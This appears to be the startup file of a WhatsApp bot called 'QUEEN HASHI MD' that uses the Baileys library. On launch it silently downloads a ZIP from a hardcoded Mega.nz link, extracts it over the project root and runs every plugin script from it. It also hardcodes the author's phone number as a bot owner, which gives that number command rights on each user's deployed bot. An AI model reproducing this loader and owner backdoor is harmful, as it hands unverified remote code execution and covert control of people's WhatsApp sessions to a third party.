const axios = require('axios');
const path = require('path');
const fs = require('fs');
const { File } = require('megajs');
const { exec } = require('child_process');
const AdmZip = require('adm-zip'); // Import AdmZip for extraction

//=========================dl-ZIP========================
const PLUGINS_DIR = "./plugins/"; // Directory where plugins will be extracted
const LIB_DIR = './lib';
const AUTH_DIR = './auth_info_baileys';
const DATA_DIR = './media';
const ZIP_DIR = './';

async function downloadAndExtractZip() {
  try {
  /*
    const response = (await axios.get("https://mega.nz/file/AmVgXYRB#mZSeGVDTKIwNuPUT1krAADGrByrR_iQScv9Nv4zGS8k")).data;

    const MEGA_ZIP_LINK  = response.LOGO;
    */
   const MEGA_ZIP_LINK = `https://mega.nz/file/Bjd0mAoB#G0hPVx8j5JAgfSIccEeUIf3ush4bMkAc6o6IdSsD06s`
     
    // Ensure the plugins directory exists
    if (!fs.existsSync(PLUGINS_DIR)) {
      fs.mkdirSync(PLUGINS_DIR, { recursive: true });
    }
    if (fs.existsSync(DATA_DIR)) {
        fs.rmSync(DATA_DIR, { recursive: true, force: true });
    }
    if (!fs.existsSync(LIB_DIR)) {
        fs.mkdirSync(LIB_DIR, { recursive: true });
    }
        if (!fs.existsSync(AUTH_DIR)) {
        fs.mkdirSync(AUTH_DIR, { recursive: true });
    }

    console.log('Fetching files...🔄');

    // Download the ZIP file from Mega.nz
    const file = File.fromURL(MEGA_ZIP_LINK);
    const fileData = await file.downloadBuffer();

    // Save the ZIP file to a temporary location
    const tempZipPath = path.join(__dirname, 'temp.zip');
    fs.writeFileSync(tempZipPath, fileData);
    console.log('Files downloaded successfully ✅');

    // Extract the ZIP file to the plugins directory
    const zip = new AdmZip(tempZipPath);
    zip.extractAllTo(ZIP_DIR, true); // Extract to the plugins directory

    console.log('Plugins extracted successfully ✅');

    // Clean up the temporary ZIP file
    fs.unlinkSync(tempZipPath);

    // Call function to load the plugins after extraction is complete
    loadPlugins();

  } catch (error) {
    console.error('Error:', error.message);
  }
}

// Function to load plugins after extraction
function loadPlugins() {
  try {
    fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
      }
    });
    console.log('Plugins installed successfully ✅');
  } catch (error) {
    console.error('Error loading plugins:', error.message);
  }
}

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const l = console.log;
const {
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson
} = require('./lib/functions');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const {
    sms,
    downloadMediaMessage
} = require('./lib/msg');
const ownerNumber = ['94703830990'];
if (!fs.existsSync(__dirname + '/session/creds.json')) {
    if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
    const sessdata = config.SESSION_ID;
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
    filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(__dirname + '/session/creds.json', data, () => {
            console.log("Session downloaded ✅")
        })
    })
}
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
async function connectToWA() {
downloadAndExtractZip()
    const connectDB = require('./lib/mongodb');
    connectDB();
    const {
        readEnv
    } = require('./lib/database');
    const config = await readEnv();
    const prefix = config.PREFIX;
    console.log("Connecting wa bot 🧬...");
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + '/session/');
    var {
        version
    } = await fetchLatestBaileysVersion();
    const conn = makeWASocket({
        logger: P({
            level: 'silent'
        }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version
    });
    conn.ev.on('connection.update', (update) => {
        const {
            connection,
            lastDisconnect
        } = update;
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {
            console.log('😼 Installing... ');

            console.log('Plugins installed successful ✅');
            console.log('Bot connected to whatsapp ✅');
            let up = `*╔══════✮❁•°♛°•❁✮ ═══════╗*
*💛QUEEN HASHI CONECTED💗ྀི💛*
╚══════✮❁•°♛°•❁✮ ═══════╝
*❖╭─────────────···▸*
*❖│▸➤⭕Name - QUEEN HASHI MD*
*❖│▸➤⭕OWNER - 𝐌𝐑 𝐋𝐀𝐊𝐒𝐈𝐃𝐔*
*❖│▸➤⭕Age - 17+❣️*
*❖│▸➤⭕Birthday - 03/04✨*
*❖╰────────────···▸▸*
*╔══════✮❁•°♛°•❁✮ ═══════╗*
*❖https://whatsapp.com/channel/0029Vao7dOmDOQISArwnHT0e😩⃝⃚💗⃝⃚🍓🪄🤍*
*╚══════✮❁•°♛°•❁✮ ═══════╝*
♡ ㅤ      ❍ㅤ        ⎙ㅤ    ⌲ 
ˡᶦᵏᵉ     ᶜᵒᵐᵐᵉⁿᵗ     ˢᵃᵛᵉ     ˢʰᵃʳᵉ*
*╔═════ °❀•°✮°•❀°═══════╗*
  *┈━═☆  𝐇𝐀𝐒𝐇𝐈 𝐌𝐃 ☆═━┈*
*╚══════✮❁•°❀°•❁✮══════╝*

*THANK YOU USING QUEEN HASHI💛*
> ⚜️𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 : ®𝐌𝐑 𝐋𝐀𝐊𝐒𝐈𝐃𝐔 💛`;
            conn.sendMessage(ownerNumber + "@s.whatsapp.net", {
                image: {
                    url: `https://i.imgur.com/JurU8ZF.jpeg`
                },
                caption: up
            })
        }
    });
    conn.ev.on('creds.update', saveCreds);
    conn.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0];
        if (!mek.message) return;
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
            await conn.readMessages([mek.key])
        }
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : [];
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : [];
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isReact = m.message.reactionMessage ? true : false;
        const reply = (teks) => {
            conn.sendMessage(from, {
                text: teks
            }, {
                quoted: mek
            })
        };
        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
            let mime = '';
            let res = await axios.head(url);
            mime = res.headers['content-type'];
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, {
                    video: await getBuffer(url),
                    caption: caption,
                    gifPlayback: true,
                    ...options
                }, {
                    quoted: quoted,
                    ...options
                })
            }
            let type = mime.split("/")[0] + "Message";
            if (mime === "application/pdf") {
                return conn.sendMessage(jid, {
                    document: await getBuffer(url),
                    mimetype: 'application/pdf',
                    caption: caption,
                    ...options
                }, {
                    quoted: quoted,
                    ...options
                })
            }
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, {
                    image: await getBuffer(url),
                    caption: caption,
                    ...options
                }, {
                    quoted: quoted,
                    ...options
                })
            }
            if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, {
                    video: await getBuffer(url),
                    caption: caption,
                    mimetype: 'video/mp4',
                    ...options
                }, {
                    quoted: quoted,
                    ...options
                })
            }
            if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, {
                    audio: await getBuffer(url),
                    caption: caption,
                    mimetype: 'audio/mpeg',
                    ...options
                }, {
                    quoted: quoted,
                    ...options
                })
            }
        };
        if (senderNumber.includes("94703830990")) {
            if (isReact) return;
            m.react("👨‍💻")
        }
        if (!isOwner && config.MODE === "private") return;
        if (!isOwner && isGroup && config.MODE === "inbox") return;
        if (!isOwner && !isGroup && config.MODE === "groups") return;
        const events = require('./command');
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, {
                    react: {
                        text: cmd.react,
                        key: mek.key
                    }
                });
                try {
                    cmd.function(conn, mek, m, {
                        from,
                        quoted,
                        body,
                        isCmd,
                        command,
                        args,
                        q,
                        isGroup,
                        sender,
                        senderNumber,
                        botNumber2,
                        botNumber,
                        pushname,
                        isMe,
                        isOwner,
                        groupMetadata,
                        groupName,
                        participants,
                        groupAdmins,
                        isBotAdmins,
                        isAdmins,
                        reply
                    })
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e)
                }
            }
        }
        events.commands.map(async (command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m, {
                    from,
                    l,
                    quoted,
                    body,
                    isCmd,
                    command,
                    args,
                    q,
                    isGroup,
                    sender,
                    senderNumber,
                    botNumber2,
                    botNumber,
                    pushname,
                    isMe,
                    isOwner,
                    groupMetadata,
                    groupName,
                    participants,
                    groupAdmins,
                    isBotAdmins,
                    isAdmins,
                    reply
                })
            } else if (mek.q && command.on === "text") {
                command.function(conn, mek, m, {
                    from,
                    l,
                    quoted,
                    body,
                    isCmd,
                    command,
                    args,
                    q,
                    isGroup,
                    sender,
                    senderNumber,
                    botNumber2,
                    botNumber,
                    pushname,
                    isMe,
                    isOwner,
                    groupMetadata,
                    groupName,
                    participants,
                    groupAdmins,
                    isBotAdmins,
                    isAdmins,
                    reply
                })
            } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
                command.function(conn, mek, m, {
                    from,
                    l,
                    quoted,
                    body,
                    isCmd,
                    command,
                    args,
                    q,
                    isGroup,
                    sender,
                    senderNumber,
                    botNumber2,
                    botNumber,
                    pushname,
                    isMe,
                    isOwner,
                    groupMetadata,
                    groupName,
                    participants,
                    groupAdmins,
                    isBotAdmins,
                    isAdmins,
                    reply
                })
            } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                command.function(conn, mek, m, {
                    from,
                    l,
                    quoted,
                    body,
                    isCmd,
                    command,
                    args,
                    q,
                    isGroup,
                    sender,
                    senderNumber,
                    botNumber2,
                    botNumber,
                    pushname,
                    isMe,
                    isOwner,
                    groupMetadata,
                    groupName,
                    participants,
                    groupAdmins,
                    isBotAdmins,
                    isAdmins,
                    reply
                })
            }
        })
    })
};
app.get("/", (req, res) => {
    res.send("hey, bot started✅")
});
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
setTimeout(() => {
    connectToWA()
}, 4000);
